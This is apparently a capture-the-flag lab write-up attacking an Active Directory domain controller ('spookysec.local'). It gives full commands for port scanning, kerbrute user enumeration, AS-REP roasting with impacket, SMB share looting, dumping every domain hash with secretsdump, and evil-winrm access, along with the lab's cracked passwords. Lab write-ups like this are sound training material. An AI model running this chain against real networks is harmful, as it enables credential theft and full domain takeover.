Starting with the enumeration we start with a basic nmap scan `sudo nmap -p- 10.201.59.217 -sCV -oN nmap.init` 
We have a the netbios name `THM-AD` and a domain `spookysec.local` 
```
53 DNS
80 IIS webserver 10.0
88 Kerberos
135 RPC
139 netbios-ssn
389 LDAP
445 microsoft-ds
464 kpasswd
593 ncan-http
636
3268 ldap
3269 
3389 RDP
5985 
9389
```
Now we need to kerbrute and find a username `kerbrute username -d spookysec.local --dc 10.201.59.217 userlist.txt` and we got a bunch of accounts but two main ones `svc-admin` and `backup` now we need to get the ticket `impacket-GetNPUsers spookysec.local/svc-admin -no-pass` and now we need to crack the `svc-admin` account `management2005` we can use netexec to look at the shares and then use smbclient to connect to the share `nxc spookysec.local -u svc-admin -p management2005` and we get a couple shares the one were looking for is `backup` `smbclient //spookysec.local/backup -U svc-admin` and we get a file called `backup_credentials.txt` and it has some text that is `base64` encoded and we get some more creds `backup@spookysec.local:backup2517860`  now since we have access to this account and it syncs to the admin account we can use `secretsdump` to dump all the hashes `impacket-secretsdump spookysec.local/backup:backup2517860@10.201.6.235` and we have all the hashes now and we can use `evil-winrm` to auth to the domain